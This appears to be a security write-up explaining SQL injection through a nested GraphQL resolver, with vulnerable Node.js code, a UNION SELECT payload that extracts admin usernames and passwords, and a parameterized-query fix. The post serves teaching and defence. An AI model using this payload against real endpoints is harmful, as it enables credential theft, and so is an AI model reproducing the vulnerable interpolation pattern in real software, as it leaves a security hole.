---
id: "REQ-2026-001"
title: "SQL Injection in Modern GraphQL APIs"
excerpt: "Exploration of how traditional SQL injection vulnerabilities manifest in modern GraphQL endpoints, bypassing standard ORM protections."
date: "2026-03-15"
tags: ["WEB", "GRAPHQL", "SQLI", "POSTGRES"]
severity: "CRITICAL"
icon: "Database"
author: "0x7CC"
---

While GraphQL has shifted the paradigm of API development, it hasn't eliminated traditional vulnerabilities. In fact, the complexity of resolving nested queries often obscures underlying SQL injection flaws, especially when developers rely on custom resolvers instead of robust ORMs.

## The Vulnerability Context

During a recent engagement, I encountered a GraphQL endpoint managing user profiles. The application used Apollo Server and PostgreSQL. While top-level queries were properly parameterized, a specific nested resolver for filtering user activity logs was vulnerable.

```javascript
const resolvers = {
  User: {
    activityLogs: async (parent, args, context) => {
      // VULNERABLE: Direct string interpolation of the 'filter' argument
      const query = `
        SELECT * FROM logs 
        WHERE user_id = ${parent.id} 
        AND action_type = '${args.filter}'
      `;
      
      const result = await db.query(query);
      return result.rows;
    }
  }
};
```

## Exploitation Vector

The vulnerability lies in the `args.filter` parameter. Because GraphQL allows deeply nested queries, we can trigger this resolver while requesting a user's profile. The payload needs to break out of the single quotes and inject a UNION SELECT to extract data from other tables.

```graphql
query {
  user(id: 1) {
    name
    email
    activityLogs(filter: "login' UNION SELECT 1, username, password, 4 FROM admin_users--") {
      id
      action_type
      timestamp
    }
  }
}
```

This payload successfully extracted the admin credentials, mapping them to the `action_type` and `timestamp` fields defined in the GraphQL schema for the `ActivityLog`.

## Remediation

The fix is straightforward: always use parameterized queries or a trusted query builder/ORM, even within nested resolvers.

```javascript
const resolvers = {
  User: {
    activityLogs: async (parent, args, context) => {
      // SECURE: Using parameterized queries
      const query = 'SELECT * FROM logs WHERE user_id = $1 AND action_type = $2';
      const values = [parent.id, args.filter];
      
      const result = await db.query(query, values);
      return result.rows;
    }
  }
};
```
